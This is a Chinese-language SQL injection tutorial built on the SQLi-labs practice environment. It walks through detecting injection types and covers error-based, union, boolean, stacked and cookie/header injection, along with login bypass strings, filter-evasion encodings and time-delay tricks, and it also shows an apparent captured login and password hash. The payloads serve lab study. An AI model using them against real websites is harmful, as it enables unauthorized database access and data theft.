# SQL注入指北

```
    ....    ........................
            ....]]O@@@@@@@@@\]].....
    .......]@@@@@@@@@@@@@@@@@@@@@@\]....
    ...,/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`.
.....,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`...
..../@@@@@@O@@@@@@@@@@@@@@@@@@@@@@OO@@@@@\..
...O@@@@@O.....,\@O[[[[[[[[[O@[.   .=@@@@@O..
..O@@@@@@O............ ..........   .@@@@@@O.
.=@@@@@@@@.........,]...,OO\]...    =@@@@@@@^
.@@@@@@@O.... ..\[[[\Oo.,*......    .,@@@@@@@
=@@@@@@@..  ....,[O/`.....,`...     ..=@@@@@@
=@@@@@@O.. . . ......*..........    ...@@@@@@
=@@@@@@O....    ....[\O@@O/.,...    ..=@@@@@@
,@@@@@@@`. .    ..*,`.]OOOO\....    ../@@@@@@
.O@@@@@@@`.........**[[[`.,`... ...../@@@@@@O
.,@@@@@@@@\`........**[OOOO... ....,@@@@@@@@`
..=@@/,[O@@@@O]`....    .......]/@@@@@@@@@@^
...,@@@\..\@@@@@@O..    ....=@@@@@@@@@@@@@^.
    .@@@\...[\O/[...        .=@@@@@@@@@@@...
    ..,@@@].........        .=@@@@@@@@@`....
        ,@@@@@@@@..         .=@@@@@@@`..
        ...,@@@@@. .        .=@@@@`.....
         .  ....[...        ....

```

## 本文基于SQli-lab 综合编写 --俺是个菜狗

https://blog.csdn.net/u012763794/article/category/6210965

参数
--random-agent
随机设定userangent


## 常用URL编码
> 常用的写出来吧： `空格是%20，单引号是%27， 井号是%23，双引号是%22`

## 常用表：
因为是mysql，所以啥都不清楚的话 透`INFORMATION_SCHEMA.TABLES`表就行了。


## 判断到底是什么类型的注入
> 字符型--分析·略·

当输入的参 x 为字符型时，通常 php 中 SQL 语句类型大致如下：

`select * from <表名> where id = 'x'`

这种类型我们同样可以使用 `and '1'='1` 和 `and '1'='2`   来判断：

Url 地址中输入 
```
http://xxx/abc.php?id= x' and '1'='1
```
 页面运行正常，继续进行下一步。
Url 地址中继续输入 
```
http://xxx/abc.php?id= x' and '1'='2 
```

页面运行错误，则说明此 Sql 注入为`字符型注入`。
原因如下：

当输入` and '1'='1`时，后台执行 Sql 语句：
```sql
select * from <表名> where id = 'x' and '1'='1'
```

语法正确，逻辑判断正确，所以返回正确。

当输入 and '1'='2时，后台执行 Sql 语句：
```sql
select * from <表名> where id = 'x' and '1'='2'
```

> 数字型  --分析·略·

当输入 `and 1=1`时，后台执行 Sql 语句：

`select * from <表名> where id = `x` and 1=1`
没有语法错误且逻辑判断为正确，所以返回正常。

当输入 and 1=2时，后台执行 Sql 语句：

`select * from <表名> where id = x and 1=2`
没有语法错误但是`逻辑判断为假`，所以`返回错误`。

我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：
```sql
select * from <表名> where id = 'x and 1=1' 
select * from <表名> where id = 'x and 1=2'
```



## 基于GET的注入

一般情况下 上去一个`1'`要是报错了 大差不差就是这个了

大致语句如下:
```sql
SELECT * FROM users WHERE id='1''
```

这里多了一个单引号拿去查询必然报错，单引号无法匹配。

> 尝试下

1' order by 3#

看看返回值中

若只是报错没什么异常 再尝试


## **GET单引号变形字符型注入**

可以理解为 在搜索的时候额外加入了`括号或双引号`等:
如：
```sql
"select * from xxx where id =('$id')"
```
其中id是在`('$id')`中的值，所以注入的时候要记得加入`)`


在直接输入'的时候没有报错，先不要着急 尝试加入`双引号`,因为`双引号中可以包含单引号`


## **GET单引号字符型[双注入](https://www.jianshu.com/p/e097a1c0d9ef)**
暴躁之A君：`在，什么是双注入？编不出来打死你！`

> 原理：当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。

所使用的函数:
```
说明：
rand()是一个生成随机数的函数，他会返回0到1之间到一个值。
floor()是取整函数了，童鞋们应该都很熟悉了。
count()是一个聚合函数，用户返回符合条件的记录数量。
```
>套路(代码)大概：
```sql
select count(*),concat_ws(':',([子查询],floor(rand()*2))) as a form [table_name] group by a;
```

可以理解为因为默写插叙只会返回有和空值，所以要在查询中额外查询所要的函数值。(禁止俄罗斯套娃禁止俄罗斯套娃禁止俄罗斯套娃禁止俄罗斯套娃禁止俄罗斯套娃)

我们把`count函数`也加上，这时候需要注意，要从一张表中查询结果，具体从什么表没关系，但是一定要确保有这个表，所以比较好的选择方案就是`information_schema`中的表，比如:

```sql
select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables;
```

`BUT`如果前几次一直无返回值，也不要恐惧，解决恐惧的最好办法就是面对恐惧，坚持，就是胜利！*(奥里给)*
因为这坑爹的返回值是有50%的gay率返回为1 也就是查询有值。所以就写个脚本去试试吧 *(奥里给)*


## **导出文件GET字符型注入**

暴躁之A君：不知道那个倒霉孩子取的名字

简单的来说：`导出到文件就是可以将查询结果导出到一个文件中。`
`sqlmap`中也有导出一句话和一个文件上传的语句。
这里的语句为：

![](img/1.png)

当这里要获取到网站的在系统中的具体路径（绝对路径）

> 首先介绍两个可以说是函数，还是变量的东西(a君:淦)
```sql
@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径
```
```sql
1') union select 1,@@basedir,@@datadir %23
```

![](img/2.png)
文件不能覆盖，输入payload

![](img/3.png)
如果是在c盘等需要管理员权限的，建议梦里做注入。


## **[布尔型单引号GET盲注](https://blog.csdn.net/sdb5858874/article/details/80656144)**
A君：布尔型就是T(TRUE)F(false)boys

建议sqlmap跑跑 太费时间了


## **对于登录界面的sql注入**

![](img/4.png)

类似于这种登录界面都可以，在登录中输入个单引号康康有没有什么报错啊直接报sql代码的`(ps,反正我是没见过.)`A君：你嗦你🐎呢。

有的时候你就之内跑脚本了，但是有的时候还是可以搏一搏，摩托变骆驼。


```sql
username-a
password-a')or'1'='1#
```
一般这种登录界面的查询语句为：

```sql
select username,password from user Where username=('a') and password = ('a') or '1' ='1#')
```
这时候因为and的运算优先级大于or 所以会先判断 username和passowrd正确和错误，显然这是`false`即为0，1=1为恒真即为1，这时候数据库就会变成，判断
`0 or 1`,等价于：

```sql
SELECT username, password FROM users WHERE 0 or 1;
```

大概的思路就是这样，整合的查询语句请跳转**指北代码篇**。



## **基于错误的更新查询 uploadxml 的 POST注入**

这里的更新查询即为使用updatexml函数进行注入，但是username必须为真，也就是你最少要使出`username`才能继续注入。

updatexml()函数

大概格式为
```
UPDATEXML (XML_document, XPath_string, new_value);
函数名      文档            路径字符串    String格式
```


左右括号的十六进制分别是0x28，0x29，+号的16进制为0x2b

大概语句为：


查询数据库：
a' or updatexml (1,concat(0x282b5d,database()),1)#
a' and updatexml (1,concat(0x2b,database()),1)#

查询用户名
a' or updatexml (1,concat(0x282b5d,(select user())),1)#

如果查询的值附带在user-agent中可以尝试在后面加入`updatexml`代码尝试注入。代码同上 但是更改的值为，users的附带浏览器名。

还有第二个函数
extractvalue函数
这个函数只需要两个参数。

查询版本：
```
1 ' or extractvalue(1,concat(0x2b,version())),")#
```

loginname




## **基于cookie头部的POST注入**

在cookie后面输入一个'，尝试一下康康有没有报错，毕竟梦想还是要有的！
 判断列：
 ' order by x#

 获取表中数据

 'union select 1,2,列明 from 表名#

## **登录用户名中注入**

在注册账户的时候加入`'--`或者`#`可以在修改密码的时候跳过密码认证直接修改

即是如：
admin'--
ADMIN' #

在查询或者改密码的时候会注释掉后面的语句从而进行绕过注入。

## **过滤了注释和空格的注入**

使用16进制编码绕过 
```html
确认字段数


?id=0%27union%a0select%a01,2,3,4%a0%26%26%a0%271%27=%271
?id=0%27union%a0select%a01,2,3%a0%26%26%a0%271%27=%271
获取当前使用的数据库


?id=0%27union%a0select%a01,database(),3%a0%26%26%a0%271%27=%271
获取表信息


?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security'%26%26%a0%271%27=%271


获取列信息
?id=0%27union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema='security'%a0anandd%a0table_name='emails'%26%26%a0%271%27=%271


最后获取数据，发现提取不了

?id=0%27%a0union%a0select%a01,email_id,3%a0from%a0emails%26%26%a0%271%27=%271

```

## **联合注入`union select`**
基础语句结构为--查数据库
```
a'union select 1,2,database() %23
  联合注入函数  列数  数据库  
```

- 在查询出数据库名或者信息后，根据得到的数据库名进入mysql的`information_schema.tables`信息表中查询已知数据库的表中列的信息
```sql
1)   union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges' --
闭合  查询函数         连接字段     表名               查询信息试图表                          数据库名称
```

```
id = -1 union select
```

- `查询整个数据库中所有库和所对应的表信息`

```sql
select table_schema,group_concat(table_name)
from  information_schema.tables
group  by table_schema
```
Your Login name:NpQJ25CiVWtFNtrNlOw4GlTm
Your Password:b7490cbbbd5cfd081d8ec1930914a677




## **注入之堆叠注入**
就是在注入语句中加一个`;`然后再加入任意mysql语句即可。

列-(新建成功表)
：
```
select * from users where id=1;create table test like users;
```

**(查询数据)**
```
select * from users where id=1;select 1,2,3;
```

**[修改数据]**
```
select * from users where id=1;insert into users(id,username,password)
values('100','new','new');
```
```
?id=0" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges' --+

?id=0" union select 1,group_concat(column_name),3 from information_schema.columns where table_name='la5spfxomc' --+


?id=0" union select 1,group_concat(secret_D2E9),group_concat(sessid) from challenges.la5spfxomc --+
```

## 绕过空格(注释符 /**/，%a0)

两个空格代替一个空格，用Tab代替空格，%a0=空格：
```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```
  最基本的绕过方法，用注释替换空格：
```
/*  注释 */

```

## bypass sleep

**benchmark**

是替代sleep的首选。

用法：benchmark(执行多少次，执行什么操作)

通过修改执行的次数和执行的操作(比如`sha1(sha1(sha1(sha1())))`这样多套几层)，可以精准控制延时时间。

**笛卡尔积**

也就是所谓的 `HEAVY QUERY` ，用的不多。

**get_lock**

可以精准控制延时时间，但是不好用，因为需要维持MySQL的会话，基本用不到。

**正则**

通过正则的状态机不断进行状态转换，增加比配的时长，打到延时的目的。例如：

```
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

## 字符串截取方法

**substr()**

`这是最最最最基本的截取函数!`

使用方法：`substr(要截取的字符串，从哪一位开始截取，截取多长)`

**mid()**

和`substr()`用法基本一样，是`substr()`完美的替代品。

**right()**

表示截取字符串的右面几位。

**= > <**

最基本的比较方法！

**like**

基本上可以用来替代等号，如果没有`% _`之类的字符的话。

**AND和减法运算**

`and`也可以用`&&`来表示，是逻辑与的意思。

**OR和减法运算**

`or`也可以用`||`来表示，是逻辑或的意思。















